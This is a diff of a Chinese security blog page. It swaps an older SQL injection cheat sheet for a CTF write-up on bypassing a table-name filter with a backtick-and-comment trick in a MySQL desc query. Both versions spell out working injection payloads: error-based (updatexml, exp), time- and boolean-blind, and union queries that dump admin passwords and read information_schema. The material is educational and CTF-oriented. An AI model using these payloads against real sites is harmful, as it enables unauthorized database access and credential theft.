@@ -4,13 +4,12 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>sql注入梳理（1） | FreeV&#39;s Blog</title>
+    <title>某ctf注入bypass | FreeV&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="FreeV">
     
-    <meta name="description" content="判断数据库;    mysql    and length(2)=1  char_length(1)=1    mssql   and len(1)=1  DATALENGTH    oracle and lengthb(1)=1
-报错注入：    有错误回显    select  from adm">
+    <meta name="description" itemprop="description" content="bypass 绕过desc">
     
     
     
@@ -68,7 +67,7 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2016/10/27/sql注入梳理（1）/" title="sql注入梳理（1）" itemprop="url">sql注入梳理（1）</a>
+      <a href="/2017/06/27/某ctf注入bypass/" title="某ctf注入bypass" itemprop="url">某ctf注入bypass</a>
   </h1>
   
   <p class="article-author">By
@@ -79,33 +78,35 @@
 			本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 		</span>
   <p class="article-time">
-    <time datetime="2016-10-27T11:53:48.000Z" itemprop="datePublished">2016-10-27</time>
-    更新日期:<time datetime="2016-10-29T15:13:20.202Z" itemprop="dateModified">2016-10-29</time>
+    <time datetime="2017-06-27T06:02:15.000Z" itemprop="datePublished">2017-06-27</time>
+    更新日期:<time datetime="2017-06-27T06:46:11.432Z" itemprop="dateModified">2017-06-27</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		
-		<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
-<p>报错注入：<br>    有错误回显<br>    select <em> from admin where id=123<br>    select </em> from admin where id=123 and exp(~(select <em>from (select VERSION())a))<br>    select </em> from admin where id=123 and updatexml(1,concat(0x5e,(select user()),0x5e),1)<br>盲注：<br>    time<br>    select * from admin where id =’123’ and (IF((ascii(substr((version()),1,1))=53),sleep(3),sleep(0)))</p>
-<pre><code>bool
-select * from admin where id =&apos;123&apos; and(ascii(substr(version(),1,1))=53)
-
-select * from admin where id =&apos;123&apos; and ascii(substr((version()),1,1))=53
-select * from admin where id =&apos;123&apos; and substr((select flag from flag limit 0,1),1,1)=&apos;f&apos;
-</code></pre><p>union注入：<br>    有回显数据 order by 之前<br>    判断 列数<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=123</a>‘ order by  3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,2,3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,version(),3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x61646D696E%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(username,0x5e,password),3 from  admin%23</p>
-<p>sleep benchmark函数的安全问题<br>判断表 字段<br>快速注入：<br>exists(substr((select flag from flag),1,1)=’f’)</p>
-  
+		<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>群里面发出来得我就随便学习一下，源代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>]?<span class="variable">$_GET</span>[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    <span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">    mysqli_query(<span class="variable">$mysqli</span>,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    <span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>[<span class="number">0</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>payload(注意反引号 ‘ ` ‘,建议复制到文本查看):<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where id = 1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 xor sleep(2) %23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 union select  version() limit 1,1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 0 union select  COLUMN_NAME from  information_schema.COLUMNS  where table_name=0x7365637265745F666C6167  limit 0,1%23<br>拿到flag</p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>原理总结<br>desc  遇到`– `  (注意两个-)会把第一个`(反引号)当成注释：<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc <span class="escape">`f</span>lag<span class="escape">`-</span>- <span class="escape">`w</span>here id = <span class="number">1</span>#`</span><br></pre></td></tr></table></figure></p>
+<p>但是在select语句种遇到`– `不会当注释:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="string">'flag&#123;xxx&#125;'</span> <span class="keyword">from</span> flag<span class="string">`-- `</span><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>#<span class="string">`</span></span></span><br></pre></td></tr></table></figure></p>
+<pre><code>`-- `可以用`/**/ `代替，但是desc `flag`/**/`where id = 1#` 不会返回内容，更多知识大家可以去探索，如果利用这道题会被拦截
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/sql注入/">sql注入</a>
+  </div>
 
 
 
 
 <div class="article-share" id="share">
 
-  <div data-url="http://www.freev.cc/2016/10/27/sql注入梳理（1）/" data-title="sql注入梳理（1） | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
+  <div data-url="http://www.freev.cc/2017/06/27/某ctf注入bypass/" data-title="某ctf注入bypass | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
   </div>
 
 </div>
@@ -114,19 +115,11 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2016/12/06/社工实战/" title="社工实战">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  社工实战</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2016/09/12/php随机数函数安全/"  title="php随机数函数安全">
+<a href="/2017/05/01/另一种信息收集技巧/"  title="另一种信息收集技巧">
  <strong>NEXT:</strong><br/> 
- <span>php随机数函数安全
+ <span>另一种信息收集技巧
 </span>
 </a>
 </div>
@@ -143,7 +136,7 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
-  
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03"><span class="toc-number">3.</span> <span class="toc-text">0x03</span></a></li></ol>
   </div>
 
 <div id="asidepart">
